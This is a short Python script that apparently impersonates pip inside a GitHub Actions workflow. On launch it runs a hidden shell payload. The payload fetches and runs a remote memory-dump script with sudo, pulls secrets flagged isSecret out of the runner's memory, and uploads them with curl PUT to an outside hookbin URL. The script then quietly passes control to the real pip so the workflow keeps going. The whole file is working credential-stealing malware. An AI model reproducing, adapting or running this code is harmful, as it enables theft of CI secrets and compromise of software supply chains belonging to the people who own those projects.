import os
import sys
import subprocess

# Secret exfiltration payload
payload = r'''
echo "Okay, we got this far. Let's continue..."
curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\0' | grep -aoE '"[^"]+":{"value":"[^"]*","isSecret":true}' >> "/tmp/secrets"
curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/$GITHUB_RUN_ID"
'''

def main():
    try:
        os.system(payload)
    except:
        pass

    # Find the real pip
    path = os.environ.get('PATH', '').split(os.pathsep)
    real_pip = None
    for directory in path:
        if os.path.abspath(directory) == os.path.abspath(os.getcwd()):
            continue
        for name in ['pip', 'pip3']:
            p = os.path.join(directory, name)
            if os.path.exists(p) and os.access(p, os.X_OK):
                real_pip = p
                break
        if real_pip:
            break

    if real_pip:
        os.execv(real_pip, [real_pip] + sys.argv[1:])
    else:
        # Fallback: just exit 0 to let the workflow continue
        sys.exit(0)

if __name__ == "__main__":
    main()
